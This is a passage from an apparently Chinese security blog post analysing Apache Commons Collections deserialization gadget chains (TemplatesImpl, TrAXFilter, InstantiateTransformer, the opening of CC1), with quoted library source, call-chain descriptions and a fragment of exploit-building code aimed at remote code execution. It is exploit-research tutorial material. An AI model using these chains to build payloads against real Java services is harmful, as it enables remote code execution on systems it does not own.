Contains the actual class definition for the translet class and</span><br><span class="hljs-comment">* any auxiliary classes.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[][] _bytecodes = <span class="hljs-keyword">null</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* Contains the translet class definition(s). These are created when</span><br><span class="hljs-comment">* this Templates is created or when it is read back from disk.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">private</span> Class[] _class = <span class="hljs-keyword">null</span>;<br><br><br><span class="hljs-comment">// 核心方法1，newTransformer</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title">newTransformer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException</span><br><span class="hljs-function"></span>&#123;<br>    TransformerImpl transformer;<br>		<span class="hljs-comment">// getTransletInstance可以创建实例</span><br>    transformer = <span class="hljs-keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,<br>                                      _indentNumber, _tfactory);<br><br>    <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-keyword">null</span>) &#123;<br>        transformer.setURIResolver(_uriResolver);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;<br>        transformer.setSecureProcessing(<span class="hljs-keyword">true</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> transformer;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>重点在getTransletInstance这个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-comment">// 核心方法2 getTransletInstance</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> Translet <span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-keyword">null</span>) defineTransletClasses();<br><br>        <span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span><br>        <span class="hljs-comment">// class to prevent the GC from collecting them</span><br>        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();<br> <br>      	<span class="hljs-comment"><code class="language-hljs java"><span class="hljs-comment">// 核心方法2 getTransletInstance</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> Translet <span class="hljs-title">getTransletInstance</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (_name == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">if</span> (_class == <span class="hljs-keyword">null</span>) defineTransletClasses();<br><br>        <span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span><br>        <span class="hljs-comment">// class to prevent the GC from collecting them</span><br>        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();<br> <br>      	<span class="hljs-comment">// 省略无关代码 ...</span><br></code></pre></td></tr></table></figure>

<p>可以看到__class==null时，会执行defineTransletClasses()，而后__class[_transletIndex].newInstance()，在数组中取出一个类对象调用newInstance方法。也就是说最终会产生一个类对象。进一步跟进defineTransletClasses方法看看</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-comment">// 核心方法3，defineTransletClasses，根据字节码，创建类对象</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException </span>&#123;<br><br>    <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-keyword">null</span>) &#123; <br>        <span class="hljs-comment">// 这里如果_bytecodes==null，程序直接报错，所以不能为null</span><br>        ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>    &#125;<br><br>    <span class="hljs-comment">// 获取classLoader，用于后面加载类的字节码</span><br>    TransletClassLoader loader = (TransletClassLoader)  AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction() &#123;<br>            <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader());<br>            &#125;<br>        &#125;);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 创建常量</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> classCount = _bytecodes.length;<br>        _class = <span class="hljs-keyword">new</span> Class[classCount];<br><br>        <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;<br>            _auxClasses = <span class="hljs-keyword">new</span> Hashtable();<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>            <span class="hljs-comment">// 循环使用defineClass加载类字节码，返回类对象</span><br>            _class[i] = loader.defineClass(_bytecodes[i]);<br>            <span class="hljs-comment"><code class="language-hljs java"><span class="hljs-comment">// 核心方法3，defineTransletClasses，根据字节码，创建类对象</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">defineTransletClasses</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException </span>&#123;<br><br>    <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-keyword">null</span>) &#123; <br>        <span class="hljs-comment">// 这里如果_bytecodes==null，程序直接报错，所以不能为null</span><br>        ErrorMsg err = <span class="hljs-keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> TransformerConfigurationException(err.toString());<br>    &#125;<br><br>    <span class="hljs-comment">// 获取classLoader，用于后面加载类的字节码</span><br>    TransletClassLoader loader = (TransletClassLoader)  AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction() &#123;<br>            <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader());<br>            &#125;<br>        &#125;);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 创建常量</span><br>        <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> classCount = _bytecodes.length;<br>        _class = <span class="hljs-keyword">new</span> Class[classCount];<br><br>        <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;<br>            _auxClasses = <span class="hljs-keyword">new</span> Hashtable();<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>            <span class="hljs-comment">// 循环使用defineClass加载类字节码，返回类对象</span><br>            _class[i] = loader.defineClass(_bytecodes[i]);<br>            <span class="hljs-comment">// 省略后的代码，后面基本不用看了，因为没有对__class数组产生影响，返回前面的getTransletInstance函数中</span><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>返回到getTransletInstance，关键在于执行了__class[_transletIndex].newInstance()创建类对象，这一步就可以在自定义的恶意类静态代码块添加恶意代码了。</p>
<p>此时需要有个类能执行newTransformer，比如TransformingComparator，其实这就是为什么要介绍TransformingComparator的原因，通过TransformingComparator的compare来执行transform，而transform又InvokerTransformer包装来执行TemplateImpl的newTransformer，在TemplateImpl创建类时注入恶意的类即可实现RCE。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-comment">// 创建InvokerTransformer实例，并写好newTransfomer方法调用</span><br>InvokerTransformer transformer=<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;&#125;,<span class="hljs-keyword">new</span> Object[]&#123;&#125;);<br><span class="hljs-comment">// 创建TransformingComparator实例，放在后面的PriorityQueue中</span><br>TransformingComparator comparator=<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-comment">// 创建InvokerTransformer实例，并写好newTransfomer方法调用</span><br>InvokerTransformer transformer=<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;&#125;,<span class="hljs-keyword">new</span> Object[]&#123;&#125;);<br><span class="hljs-comment">// 创建TransformingComparator实例，放在后面的PriorityQueue中</span><br>TransformingComparator comparator=<span class="hljs-keyword">new</span> TransformingComparator(transformer);<br></code></pre></td></tr></table></figure>

<p>流程：</p>
<p>TransformingComparator.compare(e)-&gt;transformer.transform(e))-&gt;invokerTransformer.transform(e)-&gt;     TemplatesImpl.newTransform-&gt;TemplatesImpl.getTransletInstance-&gt;_class[_transletIndex].newInstance()</p>
<p>到这里就差一个类的readObject里面有compare这个方法了，也就是后面的PriorityQueue.</p>
<h2 id="0x2-5-TrAXFilter"><a href="#0x2-5-TrAXFilter" class="headerlink" title="0x2.5 TrAXFilter"></a>0x2.5 TrAXFilter</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter ，这个类的构造方法会传入Templates，调用newTransformer方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-comment">/***</span><br><span class="hljs-comment"> * skeleton extension of XMLFilterImpl for now.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Santiago Pericas-Geertsen</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> G. Todd Miller</span><br><span class="hljs-comment"> */</span><br> <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrAXFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">XMLFilterImpl</span> </span>&#123;<br>   <span class="hljs-keyword">private</span> Templates       _templates;<br>   <span class="hljs-keyword">private</span> TransformerImpl    _transformer;<br>   <span class="hljs-keyword">private</span> TransformerHandlerImpl _transformerHandler;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> _useServicesMechanism = <span class="hljs-keyword">true</span>;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrAXFilter</span><span class="hljs-params">(Templates templates)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">     TransformerConfigurationException</span><br><span class="hljs-function">   </span>&#123;<br>     _templates = templates;<br>     _transformer = (TransformerImpl) templates.newTransformer();<br>     _transformerHandler = <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-comment">/***</span><br><span class="hljs-comment"> * skeleton extension of XMLFilterImpl for now.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> Santiago Pericas-Geertsen</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> G. Todd Miller</span><br><span class="hljs-comment"> */</span><br> <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TrAXFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">XMLFilterImpl</span> </span>&#123;<br>   <span class="hljs-keyword">private</span> Templates       _templates;<br>   <span class="hljs-keyword">private</span> TransformerImpl    _transformer;<br>   <span class="hljs-keyword">private</span> TransformerHandlerImpl _transformerHandler;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> _useServicesMechanism = <span class="hljs-keyword">true</span>;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TrAXFilter</span><span class="hljs-params">(Templates templates)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">     TransformerConfigurationException</span><br><span class="hljs-function">   </span>&#123;<br>     _templates = templates;<br>     _transformer = (TransformerImpl) templates.newTransformer();<br>     _transformerHandler = <span class="hljs-keyword">new</span> TransformerHandlerImpl(_transformer);<br>     _useServicesMechanism = _transformer.useServicesMechnism();<br>   &#125;<br></code></pre></td></tr></table></figure>



<h2 id="0x2-6-InstantiateTransformer"><a href="#0x2-6-InstantiateTransformer" class="headerlink" title="0x2.6 InstantiateTransformer"></a>0x2.6 InstantiateTransformer</h2><p>org.apache.commons.collections.functors.InstantiateTransformer 这个类的利用点在于transform方法会通过反射创建一个新类出来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InstantiateTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">3786388740793356347L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Transformer NO_ARG_INSTANCE = <span class="hljs-keyword">new</span> InstantiateTransformer();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class[] iParamTypes;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] iArgs;<br>	<br>  <span class="hljs-comment">// 参数可控</span><br>	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title">getInstance</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (paramTypes == <span class="hljs-keyword">null</span> &amp;&amp; args != <span class="hljs-keyword">null</span> || paramTypes != <span class="hljs-keyword">null</span> &amp;&amp; args == <span class="hljs-keyword">null</span> || paramTypes != <span class="hljs-keyword">null</span> &amp;&amp; args != <span class="hljs-keyword">null</span> &amp;&amp; paramTypes.length != args.length) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;Parameter types must match the arguments&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (paramTypes != <span class="hljs-keyword">null</span> &amp;&amp; paramTypes.length != <span class="hljs-number">0</span>) &#123;<br>            paramTypes = (Class[])((Class[])paramTypes.clone());<br>            args = (Object[])((Object[])args.clone());<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> InstantiateTransformer(paramTypes, args);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> NO_ARG_INSTANCE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">InstantiateTransformer</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iParamTypes = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">this</span>.iArgs = <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InstantiateTransformer</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iParamTypes = paramTypes;<br>        <span class="hljs-keyword">this</span>.iArgs = args;<br>    &#125;<br>	<br>	<br>	<span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(input <span class="hljs-keyword">instanceof</span> Class)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="hljs-keyword">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>              	<span class="hljs-comment">// 核心在这</span><br>                Constructor con = ((Class)input).getConstructor(<span class="hljs-keyword">this</span>.iParamTypes);<br>                <span class="hljs-keyword">return</span> con.newInstance(<span class="hljs-keyword">this</span>.iArgs);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InstantiationException var4) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, var4);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, var5);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var6) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InstantiateTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Transformer</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">3786388740793356347L</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Transformer NO_ARG_INSTANCE = <span class="hljs-keyword">new</span> InstantiateTransformer();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class[] iParamTypes;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] iArgs;<br>	<br>  <span class="hljs-comment">// 参数可控</span><br>	<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title">getInstance</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (paramTypes == <span class="hljs-keyword">null</span> &amp;&amp; args != <span class="hljs-keyword">null</span> || paramTypes != <span class="hljs-keyword">null</span> &amp;&amp; args == <span class="hljs-keyword">null</span> || paramTypes != <span class="hljs-keyword">null</span> &amp;&amp; args != <span class="hljs-keyword">null</span> &amp;&amp; paramTypes.length != args.length) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;Parameter types must match the arguments&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (paramTypes != <span class="hljs-keyword">null</span> &amp;&amp; paramTypes.length != <span class="hljs-number">0</span>) &#123;<br>            paramTypes = (Class[])((Class[])paramTypes.clone());<br>            args = (Object[])((Object[])args.clone());<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> InstantiateTransformer(paramTypes, args);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> NO_ARG_INSTANCE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">InstantiateTransformer</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iParamTypes = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">this</span>.iArgs = <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InstantiateTransformer</span><span class="hljs-params">(Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.iParamTypes = paramTypes;<br>        <span class="hljs-keyword">this</span>.iArgs = args;<br>    &#125;<br>	<br>	<br>	<span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (!(input <span class="hljs-keyword">instanceof</span> Class)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="hljs-keyword">null</span> ? <span class="hljs-string">&quot;null object&quot;</span> : input.getClass().getName()));<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>              	<span class="hljs-comment">// 核心在这</span><br>                Constructor con = ((Class)input).getConstructor(<span class="hljs-keyword">this</span>.iParamTypes);<br>                <span class="hljs-keyword">return</span> con.newInstance(<span class="hljs-keyword">this</span>.iArgs);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InstantiationException var4) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, var4);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var5) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, var5);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException var6) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> FunctorException(<span class="hljs-string">"InstantiateTransformer: Constructor threw an exception"</span>, var6);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h1 id="0x3-readObject"><a href="#0x3-readObject" class="headerlink" title="0x3 readObject"></a>0x3 readObject</h1><p>下面的利用链都是基于上面的排列组合，在readObject中有成员可控可以执行上面的类。</p>
<h2 id="0x3-1-Commoms-Collections1"><a href="#0x3-1-Commoms-Collections1" class="headerlink" title="0x3.1 Commoms Collections1"></a>0x3.1 Commoms Collections1</h2><p>限制：</p>
<ul>
<li><p>CommonsCollections 3.1 - 3.2.1</p>
</li>
<li><p>JDK版本：1.7 （8u71之后已修复不可利用）</p>
</li>
</ul>
<p>CC1主要是用到了动态代理sun.reflect.annotation.AnnotationInvocationHandler，所谓动态代理就是一种直接实例化接口的方式，借助于中间代理类InvocationHandler的invoke方法来创建实例，而AnnotationInvocationHandler是一个与注解相关的代理类。</p>
<p>当使用AnnotationInvocationHandler创建代理类时，就会执行invoke方法，也就是会执行map.get</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnnotationInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">6182022883658399397L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class&lt;? extends Annotation&gt; type;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, Object&gt; memberValues;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-keyword">volatile</span> Method[] memberMethods = <span class="hljs-keyword">null</span>;<br><br>    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;<br>        <span class="hljs-keyword">this</span>.type = var1;<br>        <span class="hljs-keyword">this</span>.memberValues = var2;<br>    &#125;<br> <br>		<span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;<br>        String var4 = var2.getName();<br>        Class[] var5 = var2.getParameterTypes();<br>        <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="hljs-number">1</span> &amp;&amp; var5[<span class="hljs-number">0</span>] == Object.class) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.equalsImpl(var3[<span class="hljs-number">0</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">assert</span> var5.length == <span class="hljs-number">0</span>;<br><br>            <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;toString&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.toStringImpl();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;hashCode&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.hashCodeImpl();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var4.equals(<span class="hljs-string">&quot;annotationType&quot;</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.type;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>              <br>              	<span class="hljs-comment">// 重点在这里，执行了Map的get方法，所以可以使用LazyMap</span><br>                Object var6 = <span 